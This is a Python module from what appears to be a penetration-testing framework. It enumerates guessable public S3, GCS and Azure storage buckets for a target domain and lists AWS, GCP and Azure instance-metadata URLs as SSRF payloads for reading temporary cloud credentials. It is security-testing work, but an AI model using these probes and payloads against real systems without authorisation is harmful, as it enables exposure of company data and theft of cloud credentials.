"""HEAVEN — unauthenticated cloud-misconfiguration scanner.

:mod:`heaven.recon.cloud_enum` audits a cloud account *from the inside* — it
needs the target's boto3/gcloud/azure credentials. That is the wrong tool for a
black-box engagement, where the tester has no such keys. This module closes that
gap with two self-contained, credential-free checks a real external pentester
runs first:

  1. **Public cloud-storage exposure.** Company data routinely leaks through
     world-readable S3 / GCS / Azure Blob buckets whose names are guessable from
     the target domain. :class:`CloudStorageScanner` derives candidate names,
     probes each provider, and — crucially — distinguishes a **listable** bucket
     (critical: contents are enumerable) from one that merely **exists but is
     private** (informational) from one that is **absent**, by parsing the
     provider's own XML/HTTP response. No guessing, no false "it's public".

  2. **Cloud instance-metadata SSRF.** If a target is vulnerable to SSRF, the
     highest-impact target is the link-local metadata service
     (169.254.169.254 / metadata.google.internal), which hands out temporary
     IAM credentials. :data:`CLOUD_METADATA_ENDPOINTS` catalogs the AWS/GCP/Azure
     endpoints (with the required headers and a success indicator) and
     :func:`classify_metadata_response` confirms a hit only on a real credential
     marker — so this plugs into HEAVEN's existing SSRF proof rather than
     guessing.

Everything degrades gracefully without ``aiohttp`` (returns no findings, never
raises) and every parser is pure and unit-tested against canned responses.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Optional
from urllib.parse import urlparse

from heaven.postex import mitre_attack as mitre
from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.cloud")

# Common suffixes appended to a base name when hunting for storage buckets.
_BUCKET_AFFIXES = [
    "", "-assets", "-backup", "-backups", "-dev", "-test", "-staging", "-stage",
    "-prod", "-production", "-static", "-media", "-uploads", "-upload", "-data",
    "-logs", "-log", "-public", "-private", "-cdn", "-files", "-images", "-img",
    "-web", "-www", "-config", "-secrets", "-db", "-dump", "-archive", "-share",
]


# ── Cloud instance-metadata endpoints (SSRF targets) ─────────────────────────
@dataclass(frozen=True)
class MetadataEndpoint:
    provider: str
    url: str
    headers: dict[str, str]
    indicator: str   # substring proving a successful credential/metadata read
    note: str


CLOUD_METADATA_ENDPOINTS: list[MetadataEndpoint] = [
    MetadataEndpoint(
        "aws", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        {}, "", "AWS IMDSv1 role list — append the role name for temporary keys"),
    MetadataEndpoint(
        "aws",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
        {}, "AccessKeyId", "AWS instance-role temporary credentials"),
    MetadataEndpoint(
        "gcp",
        "http://metadata.google.internal/computeMetadata/v1/instance/"
        "service-accounts/default/token",
        {"Metadata-Flavor": "Google"}, "access_token",
        "GCP service-account OAuth token"),
    MetadataEndpoint(
        "azure",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        {"Metadata": "true"}, "compute",
        "Azure instance metadata (subscription/resource identifiers)"),
    MetadataEndpoint(
        "azure",
        "http://169.254.169.254/metadata/identity/oauth2/token"
        "?api-version=2018-02-01&resource=https://management.azure.com/",
        {"Metadata": "true"}, "access_token",
        "Azure managed-identity access token"),
]


def metadata_ssrf_candidates() -> list[dict[str, Any]]:
    """URLs (+ headers) to feed an SSRF sink to reach cloud metadata."""
    return [
        {"provider": e.provider, "url": e.url, "headers": dict(e.headers),
         "indicator": e.indicator, "note": e.note}
        for e in CLOUD_METADATA_ENDPOINTS
    ]


def classify_metadata_response(provider: str, status: int, body: str) -> bool:
    """True iff an SSRF fetch of a metadata endpoint proves credential access."""
    if status != 200 or not body:
        return False
    low = body.lower()
    if provider == "aws":
        return "accesskeyid" in low or "secretaccesskey" in low
    if provider == "gcp":
        return "access_token" in low
    if provider == "azure":
        return "access_token" in low or '"compute"' in low or "subscriptionid" in low
    return False


def metadata_finding(provider: str, url: str, target: str) -> dict[str, Any]:
    """Build a HEAVEN finding for a confirmed metadata-SSRF credential read."""
    f: dict[str, Any] = {
        "target": target,
        "vuln_type": "ssrf_cloud_metadata",
        "title": f"SSRF reaches {provider.upper()} instance metadata (credential theft)",
        "severity": "critical",
        "confidence": 0.97,
        "evidence": {
            "source": "vulnscan.cloud_scanner",
            "provider": provider,
            "metadata_url": url,
            "impact": "Temporary cloud credentials are readable via the SSRF sink",
        },
    }
    mitre.tag(f, mitre.T_CLOUD_METADATA)
    return f


# ── Public storage-bucket exposure ──────────────────────────────────────────
@dataclass
class BucketResult:
    provider: str
    bucket: str
    url: str
    state: str          # "open" | "exists" | "absent" | "error"
    detail: str = ""


@dataclass
class CloudStorageResult:
    target: str
    success: bool
    candidates_tried: int = 0
    buckets: list[BucketResult] = field(default_factory=list)
    error: str = ""

    @property
    def open_buckets(self) -> list[BucketResult]:
        return [b for b in self.buckets if b.state == "open"]

    @property
    def existing_buckets(self) -> list[BucketResult]:
        return [b for b in self.buckets if b.state in ("open", "exists")]

    def to_findings(self) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for b in self.buckets:
            if b.state == "open":
                sev, conf, title = ("critical", 0.95,
                                    f"Public, listable {b.provider.upper()} bucket: {b.bucket}")
            elif b.state == "exists":
                sev, conf, title = ("info", 0.6,
                                    f"{b.provider.upper()} bucket exists (private): {b.bucket}")
            else:
                continue
            f: dict[str, Any] = {
                "target": self.target,
                "vuln_type": ("exposed_storage_bucket" if b.state == "open"
                              else "cloud_asset_discovery"),
                "title": title, "severity": sev, "confidence": conf,
                "evidence": {
                    "source": "vulnscan.cloud_scanner",
                    "provider": b.provider, "bucket": b.bucket, "url": b.url,
                    "state": b.state, "detail": b.detail,
                },
            }
            if b.state == "open":
                mitre.tag(f, mitre.T_LOCAL_DATA)
            findings.append(f)
        return findings

    def to_dict(self) -> dict[str, Any]:
        return {
            "target": self.target, "success": self.success,
            "candidates_tried": self.candidates_tried, "error": self.error,
            "open_count": len(self.open_buckets),
            "exists_count": len(self.existing_buckets),
            "buckets": [
                {"provider": b.provider, "bucket": b.bucket, "url": b.url,
                 "state": b.state, "detail": b.detail}
                for b in self.buckets
            ],
        }


# Two-part public suffixes where the registrable label is the 3rd-from-last.
_MULTI_TLDS = {
    "co.uk", "org.uk", "ac.uk", "gov.uk", "me.uk", "com.au", "net.au", "org.au",
    "co.nz", "co.jp", "co.in", "co.za", "com.br", "com.mx", "com.sg", "com.tr",
    "com.cn", "com.hk", "com.tw", "co.kr", "co.id", "com.ar",
}


def _sanitize_label(label: str) -> str:
    """Reduce a hostname label to a valid S3-style bucket token."""
    return re.sub(r"[^a-z0-9-]", "", label.lower().replace("_", "-")).strip("-")


def base_names_from_target(target: str) -> list[str]:
    """Derive plausible bucket base-names from a URL or hostname."""
    host = target.strip()
    if "://" in host:
        host = urlparse(host).netloc or host
    host = host.split("@")[-1].split(":")[0].strip().lower()
    host = host.rstrip(".")
    if not host:
        return []
    labels = [x for x in host.split(".") if x]
    # Number of trailing labels that form the public suffix (1 normally, 2 for
    # co.uk / com.au / ... so the registrable label is picked correctly).
    tld_len = 2 if len(labels) >= 3 and ".".join(labels[-2:]) in _MULTI_TLDS else 1
    bases: list[str] = []
    if labels:
        reg_idx = len(labels) - tld_len - 1  # index of the registrable label
        reg = labels[reg_idx] if reg_idx >= 0 else labels[0]
        bases.append(reg)
        if reg_idx > 0:  # there is a subdomain in front of the registrable label
            sub = labels[0]
            if sub != "www":
                bases.append(sub)
                bases.append(f"{sub}-{reg}")
        # full host minus the public suffix, dots stripped (e.g. appexample).
        bases.append("".join(labels[:len(labels) - tld_len]) or labels[0])
    out: list[str] = []
    for b in bases:
        s = _sanitize_label(b)
        if s and s not in out:
            out.append(s)
    return out


def generate_bucket_candidates(target: str, extra: Optional[list[str]] = None,
                               limit: int = 60) -> list[str]:
    """All candidate bucket names for ``target`` (base names × common affixes)."""
    bases = base_names_from_target(target)
    for e in (extra or []):
        s = _sanitize_label(e)
        if s and s not in bases:
            bases.append(s)
    seen: list[str] = []
    for base in bases:
        for affix in _BUCKET_AFFIXES:
            name = f"{base}{affix}"
            # S3 naming: 3-63 chars, lowercase, no leading/trailing hyphen.
            if 3 <= len(name) <= 63 and name not in seen and not name.endswith("-"):
                seen.append(name)
    return seen[:limit]


def _bucket_urls(bucket: str) -> dict[str, str]:
    return {
        "s3": f"https://{bucket}.s3.amazonaws.com/",
        "gcs": f"https://storage.googleapis.com/{bucket}/",
        "azure": f"https://{bucket}.blob.core.windows.net/?comp=list&restype=container",
    }


def classify_bucket_response(provider: str, status: int, body: str) -> tuple[str, str]:
    """Map an HTTP status + body to ``(state, detail)``.

    Pure and provider-aware: an open bucket is one whose *listing* is returned,
    proven by the provider's XML root element — never inferred from status alone.
    """
    body = body or ""
    low = body.lower()
    if provider in ("s3", "gcs"):
        if status == 200 and "<listbucketresult" in low:
            n = len(re.findall(r"<key>", low))
            return "open", f"public listing returned ({n} keys visible)"
        if status in (200, 403) and ("accessdenied" in low or "access denied" in low):
            return "exists", "bucket exists but listing is denied (private)"
        if status == 403:
            return "exists", "403 — bucket exists but is private"
        if status == 404 or "nosuchbucket" in low or "does not exist" in low:
            return "absent", "no such bucket"
        return "error", f"unclassified status {status}"
    if provider == "azure":
        if status == 200 and "<enumerationresults" in low:
            n = len(re.findall(r"<blob>", low))
            return "open", f"public container listing returned ({n} blobs)"
        # Azure returns 404 PublicAccessNotPermitted / ContainerNotFound; a 400
        # "InvalidQueryParameterValue" means the *account* exists.
        if "publicaccessnotpermitted" in low or "resourcenotfound" in low:
            return "exists", "storage account exists; public access not permitted"
        if status == 400 and "invalidqueryparametervalue" in low:
            return "exists", "storage account exists"
        if status == 404 or "containernotfound" in low:
            return "absent", "container/account not found"
        return "error", f"unclassified status {status}"
    return "error", "unknown provider"


class CloudStorageScanner:
    """Probe guessable S3/GCS/Azure buckets for public exposure. No credentials."""

    def __init__(self, providers: Optional[list[str]] = None,
                 concurrency: int = 20, timeout: float = 8.0):
        self.providers = providers or ["s3", "gcs", "azure"]
        self.concurrency = concurrency
        self.timeout = timeout

    async def scan(self, target: str, extra_names: Optional[list[str]] = None,
                   limit: int = 60) -> CloudStorageResult:
        try:
            import aiohttp  # type: ignore[import-not-found]
        except ImportError:
            return CloudStorageResult(target=target, success=False,
                                      error="aiohttp not installed")
        import asyncio

        candidates = generate_bucket_candidates(target, extra_names, limit=limit)
        if not candidates:
            return CloudStorageResult(target=target, success=True,
                                      candidates_tried=0)

        sem = asyncio.Semaphore(self.concurrency)
        buckets: list[BucketResult] = []
        timeout = aiohttp.ClientTimeout(total=self.timeout)

        async def probe(session: Any, provider: str, bucket: str, url: str) -> None:
            async with sem:
                try:
                    async with session.get(url, allow_redirects=True) as resp:
                        text = await resp.text(errors="replace")
                        state, detail = classify_bucket_response(
                            provider, resp.status, text[:20000])
                except Exception as e:
                    state, detail = "error", f"{type(e).__name__}"
                    logger.debug("bucket probe %s failed: %s", url, e)
            if state in ("open", "exists"):
                buckets.append(BucketResult(provider, bucket, url, state, detail))

        async with aiohttp.ClientSession(timeout=timeout) as session:
            tasks = [
                probe(session, provider, bucket, _bucket_urls(bucket)[provider])
                for bucket in candidates
                for provider in self.providers
                if provider in _bucket_urls(bucket)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

        buckets.sort(key=lambda b: (b.state != "open", b.provider, b.bucket))
        logger.info("cloud storage scan %s: %d/%d candidates exposed (%d open)",
                    target, len(buckets), len(candidates),
                    sum(1 for b in buckets if b.state == "open"))
        return CloudStorageResult(
            target=target, success=True, candidates_tried=len(candidates),
            buckets=buckets)


__all__ = [
    "CloudStorageScanner", "CloudStorageResult", "BucketResult",
    "generate_bucket_candidates", "base_names_from_target",
    "classify_bucket_response",
    "CLOUD_METADATA_ENDPOINTS", "MetadataEndpoint", "metadata_ssrf_candidates",
    "classify_metadata_response", "metadata_finding",
]
